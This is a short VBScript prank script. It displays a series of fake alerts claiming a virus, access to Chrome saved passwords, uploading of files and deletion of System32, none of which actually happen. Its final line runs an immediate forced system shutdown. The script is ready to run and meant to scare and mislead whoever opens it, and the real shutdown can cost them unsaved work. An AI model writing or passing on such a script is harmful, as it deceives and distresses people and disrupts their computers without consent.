X=MsgBox("Virus detected. Do you want to remove it?",4+16,"Virus")
X=MsgBox("Error: ErrorCode 0xc00000e",2+16,"Error")
X=MsgBox("Computer files corrupt",0+16,"Error")
X=MsgBox("Accessing Chrome Password Safe...",0+64,"Password Access")
X=MsgBox("Sending files...",0+64,"Upload")
X=MsgBox("Removing system files",0+48,"Removing")
X=MsgBox("Removing C:\Windows\System32",0+48,"Removing")
X=MsgBox("Shutting down...",0+48,"Shuttdown")
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "C:\WINDOWS\system32\shutdown.exe -s -t 0"